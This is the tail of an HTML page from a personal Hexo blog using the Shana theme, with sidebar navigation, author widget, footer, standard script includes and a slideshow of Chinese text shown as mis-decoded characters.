          </a>
        
          <a href="/archives" title="Archives">
            <li>å½’æ¡£</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>åˆ†ç±»</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>æ ‡ç­¾</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
    <h2 class="author">Ash3n On3</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>14</strong><br>æ–‡ç« </div></a>
      <a href="/categories"><div><strong>0</strong><br>åˆ†ç±»</div></a>
      <a href="/tags"><div><strong>0</strong><br>æ ‡ç­¾</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>å‹é“¾</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
    </div>
  </div>
</div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2020 - 2021 Ash3n On3<br>
      ç”±<a href="http://hexo.io/" target="_blank">Hexo</a>å¼ºåŠ›é©±åŠ¨ | 
      ä¸»é¢˜-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
    </div>
    
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  
<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">

  
<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>




  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>è‹Ÿåˆ©</span></li> 
    <li><span>å›½å®¶</span></li> 
    <li><span>ç”Ÿæ­»ä»¥</span></li> 
    <li><span>å²‚èƒ½</span></li> 
    <li><span>ç¥¸ç¦</span></li> 
    <li><span>è¶‹é¿ä¹‹</span></li> 
  </ul>
</section>

<script src="/js/script.js"></script>




  </div>
</body>
</html>